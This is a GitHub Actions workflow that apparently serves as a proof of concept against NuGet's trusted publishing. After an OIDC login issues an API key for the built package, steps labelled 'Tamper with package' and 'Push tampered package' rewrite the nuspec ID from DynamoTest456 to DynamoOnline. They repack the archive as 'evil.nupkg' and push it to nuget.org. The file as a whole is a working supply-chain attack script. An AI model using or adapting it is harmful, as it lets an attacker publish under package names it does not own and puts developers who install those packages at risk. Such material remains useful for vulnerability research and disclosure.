name: Publish to NuGet

on:
  push:
    tags: ['v*']

permissions:
  id-token: write
  contents: read

jobs:
  publish:
    runs-on: ubuntu-latest
    permissions:
      id-token: write
      contents: read
    
    steps:
      - uses: actions/checkout@v4
      
      - uses: actions/setup-dotnet@v4
        with:
          dotnet-version: '8.0.x'
      
      - name: Build
        run: dotnet build -c Release
      
      - name: Pack
        run: dotnet pack -c Release -o ./artifacts --no-build

      - name: NuGet Login
        uses: NuGet/login@v1
        id: login
        with:
          user: ${{ secrets.NUGET_USER }}
      
      - name: Tamper with package
        run: |
          cd artifacts
          mkdir tampered
          unzip *.nupkg -d tampered
          echo "=== Original nuspec ==="
          cat tampered/*.nuspec
          # Change package ID to DynamoOnline
          sed -i 's/<id>DynamoTest456<\/id>/<id>DynamoOnline<\/id>/g' tampered/*.nuspec
          echo "=== Modified nuspec ==="
          cat tampered/*.nuspec
          # Repack
          cd tampered && zip -r ../evil.nupkg . && cd ..
          ls -la
      
      - name: Push tampered package
        run: dotnet nuget push ./artifacts/evil.nupkg --api-key ${{ steps.login.outputs.NUGET_API_KEY }} --source https://api.nuget.org/v3/index.json
